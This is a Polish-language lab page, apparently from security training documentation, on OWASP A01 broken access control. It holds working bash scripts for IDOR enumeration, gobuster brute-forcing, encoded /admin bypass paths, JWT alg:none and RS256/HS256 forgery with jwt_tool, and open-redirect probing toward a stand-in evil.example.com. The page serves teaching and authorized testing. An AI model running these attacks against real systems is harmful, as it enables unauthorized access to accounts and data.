---
title: A01 — Broken Access Control
sidebar_position: 2
tags: [lab, owasp-a01, idor, jwt, path-traversal]
---

# A01 — Broken Access Control

## Zakres laboratorium

- IDOR (Insecure Direct Object Reference) — dostęp do danych innych użytkowników poprzez zmianę identyfikatorów
- Omijanie kontroli dostępu przez path traversal — techniki ominięcia ochrony ścieżek administracyjnych
- Ataki JWT — alg:none, pomylenie RS256→HS256, skanowanie jwt_tool
- Otwarte przekierowania — nadużywanie parametrów przekierowania do phishingu

## Konfiguracja

Edytuj poniższe wartości przed uruchomieniem:

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/dirb/common.txt"
```

## Ćwiczenie 1: Testowanie IDOR

Iteruj po identyfikatorach użytkowników i sprawdzaj nieautoryzowany dostęp do danych profilu:

```bash
for ID in $(seq 1 20); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/api/user/profile?id=$ID")
  echo "ID $ID: HTTP $RESPONSE"
done
```

Szukaj odpowiedzi HTTP 200 dla identyfikatorów, które nie należą do uwierzytelnionego użytkownika. Prawidłowo zabezpieczony endpoint powinien zwracać 403 lub 404 dla nieautoryzowanych identyfikatorów.

## Ćwiczenie 2: Odkrywanie katalogów

Użyj gobuster do brute-forcingu katalogów i plików:

```bash
gobuster dir \
  -u "$TARGET" \
  -w "$WORDLIST" \
  -s "200,204,301,302,307,401,403" \
  -o gobuster_results.txt
```

Przejrzyj wyniki w poszukiwaniu wrażliwych ścieżek (panele administracyjne, pliki konfiguracyjne, pliki kopii zapasowych).

## Ćwiczenie 3: Omijanie kontroli dostępu przez path traversal

Kontrola dostępu na ścieżce `/admin` jest często omijana przy użyciu sztuczek z kodowaniem. Przetestuj 8 wariantów ominięcia:

```bash
BYPASSES=(
  "/..;/admin"
  "/%2e%2e;/admin"
  "/admin%20"
  "/admin%09"
  "/admin."
  "/ADMIN"
  "/admin/"
  "/admin/."
)

for BYPASS in "${BYPASSES[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$BYPASS")
  echo "Bypass '$BYPASS': HTTP $RESPONSE"
done
```

Każda odpowiedź 200 dla wariantu ominięcia, który przy bezpośrednim dostępie do `/admin` zwraca 403, stanowi podatność.

## Ćwiczenie 4: Ataki JWT

### Dekodowanie Base64 części JWT

```bash
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.signature"
HEADER=$(echo $JWT | cut -d'.' -f1 | base64 -d 2>/dev/null)
PAYLOAD=$(echo $JWT | cut -d'.' -f2 | base64 -d 2>/dev/null)
echo "Header: $HEADER"
echo "Payload: $PAYLOAD"
```

### Atak alg:none

Wymuszenie na serwerze akceptacji niepodpisanego tokenu:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -X a
```

### Pomylenie RS256 z HS256

Jeśli serwer używa RS256, ale akceptuje również HS256, podpisz token kluczem publicznym jako sekret HMAC:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -X k -pk public_key.pem
```

### Skan podatności jwt_tool

Uruchom wszystkie testy na docelowym endpoincie:

```bash
python3 /opt/jwt_tool/jwt_tool.py "$JWT" -t "$TARGET/api/protected" -rh "Authorization: Bearer $JWT" -M pb
```

## Ćwiczenie 5: Otwarte przekierowania

Przetestuj 12 popularnych parametrów przekierowania pod kątem niezweryfikowanych przekierowań:

```bash
REDIRECT_PARAMS=(
  "redirect"
  "url"
  "next"
  "return"
  "returnUrl"
  "redir"
  "goto"
  "target"
  "dest"
  "destination"
  "continue"
  "forward"
)

EVIL_URL="https://evil.example.com"

for PARAM in "${REDIRECT_PARAMS[@]}"; do
  RESPONSE=$(curl -s -o /dev/null -w "%{redirect_url}" "$TARGET/login?$PARAM=$EVIL_URL")
  if echo "$RESPONSE" | grep -q "evil.example.com"; then
    echo "[VULNERABLE] Parameter '$PARAM' redirects to: $RESPONSE"
  else
    echo "[ safe ] Parameter '$PARAM'"
  fi
done
```

Otwarte przekierowanie jest potwierdzone, gdy końcowy cel przekierowania pokrywa się z adresem URL kontrolowanym przez atakującego.
